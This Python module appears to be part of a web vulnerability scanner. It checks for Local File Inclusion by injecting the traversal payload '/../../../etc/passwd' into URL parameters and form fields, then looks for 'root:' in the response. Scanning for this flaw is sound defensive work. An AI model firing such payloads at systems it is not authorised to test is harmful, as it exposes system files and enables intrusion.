import re

from Classes.ScanConfig import ScanConfig
from Classes.Utilities import Utilities
from CustomImports import html_report


#TODO: Add more payloads LFI/RFI

def t_i_lfi(url):
    try:
        # for html_payload in self.DataStorage.payloads("HTML"):
        lfi_script = '/../../../etc/passwd'
        if '=' in url:
            url = re.sub(r'=(?!.*=).*$', f'={lfi_script}', url)
            if "root:" in ScanConfig.session.get(url).text.lower():
                return True
        form_list, form_data_list = Utilities.extract_forms_and_form_data(url)
        for index, form in enumerate(form_list):
            injection_keys = Utilities.extract_injection_fields_from_form(form_data_list[index])
            # for html_payload in self.DataStorage.payloads("HTML"):
            lfi_script = '/../../../etc/passwd'
            # Inject each payload into each injection point
            for injection_key in injection_keys:
                form_data_list[index][injection_key] = lfi_script
            response_injected = Utilities.submit_form(url, form, form_data_list[index])
            if "root:" in response_injected.text.lower():
                return True
        return False
    except Exception as e:
        Utilities.print_except_message('error', e, "Something went wrong when testing for Local File Inclusion (LFI).", url)
        pass


def run(url):
    try:
        if t_i_lfi(url):
            html_report.add_vulnerability('Local File Inclusion (LFI)',
                                          'Local File Inclusion (LFI) vulnerability identified on URL: {}'.format(url),
                                          'High')
        return
    except Exception as e:
        Utilities.print_except_message('error', e, "Something went wrong when testing for Local File Inclusion (LFI).", url)
        pass